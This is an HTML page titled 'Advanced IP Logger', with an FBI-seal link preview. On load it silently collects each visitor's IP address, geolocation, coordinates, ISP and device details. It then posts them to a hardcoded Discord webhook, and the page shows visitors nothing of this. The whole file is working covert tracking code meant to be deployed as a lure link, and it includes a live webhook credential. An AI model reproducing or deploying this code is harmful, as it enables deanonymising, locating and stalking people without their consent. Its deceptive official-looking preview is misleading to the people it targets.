<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Advanced IP Logger</title>
  <meta property="og:image" content="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" />
  <meta property="og:url" content="https://kokotzkanala.github.io/TBO-2.0-Ui/" />
  <meta property="og:type" content="website" />
</head>
<body>
  <h1>Advanced IP Logger</h1>
  <script>
    const webhookURL = "https://discord.com/api/webhooks/1403164786426122280/Qr-LlmfaJTRDq6OkG4SZ0VLAb_z0SEZKtdvNaDtOwEmo_u7wkalQjiwdJTNSLnxtTR5z";

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      let deviceType = "Unknown Device";
      let os = "Unknown OS";
      let browser = "Unknown Browser";

      // Operating system detection
      if (/Windows NT 10.0/.test(ua)) os = "Windows 10";
      else if (/Windows NT 6.3/.test(ua)) os = "Windows 8.1";
      else if (/Windows NT 6.2/.test(ua)) os = "Windows 8";
      else if (/Windows NT 6.1/.test(ua)) os = "Windows 7";
      else if (/Macintosh|Mac OS X/.test(ua)) os = "Mac OS X";
      else if (/Android/.test(ua)) os = "Android";
      else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";
      else if (/Linux/.test(ua)) os = "Linux";

      // Device type detection
      if (/Mobi|Android|iPhone|iPad|iPod/.test(ua)) deviceType = "Mobile Device";
      else deviceType = "Desktop";

      // Browser detection
      if (/Chrome/.test(ua) && !/Edge|OPR/.test(ua)) browser = "Chrome";
      else if (/Firefox/.test(ua)) browser = "Firefox";
      else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
      else if (/Edge/.test(ua)) browser = "Edge";
      else if (/OPR/.test(ua)) browser = "Opera";

      return { deviceType, os, browser };
    }

    async function logVisitor() {
      try {
        const response = await fetch('https://ipinfo.io/json?token=demo'); // Replace "demo" with your real token
        const data = await response.json();
        const { ip, city, region, country, org, loc, timezone } = data;
        const { deviceType, os, browser } = getDeviceInfo();

        const message = 
`**New Visitor!**
IP: ${ip}
Location: ${city}, ${region}, ${country}
Coordinates: ${loc}
Timezone: ${timezone}
ISP: ${org}
Device: ${deviceType}
Operating System: ${os}
Browser: ${browser}`;

        const webhookResponse = await fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: message }),
        });

        if (webhookResponse.ok) {
          console.log("Advanced log successfully sent.");
        } else {
          console.error("Error sending advanced log.");
        }
      } catch (err) {
        console.error("Logging error:", err);
      }
    }

    logVisitor();
  </script>
</body>
</html>
